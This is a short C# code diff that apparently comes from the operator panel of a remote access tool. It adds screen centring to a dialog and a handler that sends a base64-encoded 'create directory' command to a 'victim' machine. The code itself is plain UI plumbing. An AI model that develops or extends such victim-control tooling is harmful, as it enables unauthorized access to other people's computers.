@@ -23,6 +23,7 @@ namespace Eden
             m_szVictimID = szVictimID;
 
             Text = "New Directory";
+            StartPosition = FormStartPosition.CenterScreen;
         }
 
         void fnRecv(clsClient m_clnt, string szVictimID, List<string> lsMsg)
@@ -69,6 +70,14 @@ namespace Eden
         private void frmFileAddDir_FormClosed(object sender, FormClosedEventArgs e)
         {
             m_clnt.ServerMessageReceived -= fnRecv;
+        }
+
+        private void textBox1_KeyDown(object sender, KeyEventArgs e)
+        {
+            if (e.KeyCode == Keys.Enter)
+            {
+                m_clnt.SendVictim(m_szVictimID, "File|new|d|" + EZCrypto.Encoder.stre2b64(textBox1.Text));
+            }
         }
     }
 }
